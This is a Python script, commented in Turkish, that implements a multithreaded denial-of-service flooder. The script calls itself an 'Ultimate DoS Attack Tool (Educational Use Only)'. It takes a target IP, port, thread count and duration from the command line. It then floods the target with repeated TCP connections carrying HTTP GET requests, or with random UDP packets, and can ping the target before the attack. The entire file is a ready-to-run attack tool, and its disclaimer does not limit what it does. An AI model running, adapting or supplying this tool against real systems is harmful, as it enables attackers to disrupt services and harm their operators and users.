import socket
import threading
import time
import random
import argparse
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)

# Global sayaçlar
sent_packets = 0
error_count = 0

# Argümanlar
parser = argparse.ArgumentParser(description="Ultimate DoS Attack Tool (Educational Use Only)")
parser.add_argument("ip", help="Target IP address")
parser.add_argument("port", type=int, help="Target port")
parser.add_argument("-m", "--method", choices=["tcp", "udp"], default="udp", help="Attack method")
parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
parser.add_argument("--ping", action="store_true", help="Ping target before attack")
args = parser.parse_args()

# IP doğrulama
def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Ping testi
def ping_target(ip):
    log(f"Pinging {ip}...", "info")
    response = os.system(f"ping -c 1 {ip} > /dev/null 2>&1")
    if response == 0:
        log("Target is reachable.", "success")
    else:
        log("Target is unreachable. Exiting.", "error")
        sys.exit(1)

# Log fonksiyonu
def log(msg, level="info"):
    colors = {
        "info": Fore.CYAN,
        "warn": Fore.YELLOW,
        "error": Fore.RED,
        "success": Fore.GREEN
    }
    print(colors.get(level, Fore.WHITE) + f"[{time.strftime('%H:%M:%S')}] {msg}" + Style.RESET_ALL)

# TCP flood
def tcp_flood(ip, port, end_time):
    global sent_packets, error_count
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            sock.close()
            sent_packets += 1
        except:
            error_count += 1

# UDP flood
def udp_flood(ip, port, end_time):
    global sent_packets, error_count
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            sock.sendto(data, (ip, port))
            sent_packets += 1
        except:
            error_count += 1

# Saldırıyı başlat
def start_attack():
    if not validate_ip(args.ip):
        log("Invalid IP address.", "error")
        sys.exit(1)

    if args.ping:
        ping_target(args.ip)

    log(f"Starting {args.method.upper()} flood on {args.ip}:{args.port}", "warn")
    log(f"Threads: {args.threads} | Duration: {args.duration}s", "info")

    end_time = time.time() + args.duration
    threads = []

    for _ in range(args.threads):
        if args.method == "tcp":
            thread = threading.Thread(target=tcp_flood, args=(args.ip, args.port, end_time))
        else:
            thread = threading.Thread(target=udp_flood, args=(args.ip, args.port, end_time))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Bekle
    for thread in threads:
        thread.join()

    # İstatistikler
    log("Attack finished.", "success")
    log(f"Packets sent: {sent_packets}", "info")
    log(f"Errors: {error_count}", "warn")

if __name__ == "__main__":
    try:
        start_attack()
    except KeyboardInterrupt:
        log("Attack interrupted by user.", "error")
        log(f"Packets sent: {sent_packets}", "info")
        log(f"Errors: {error_count}", "warn")
        sys.exit(0)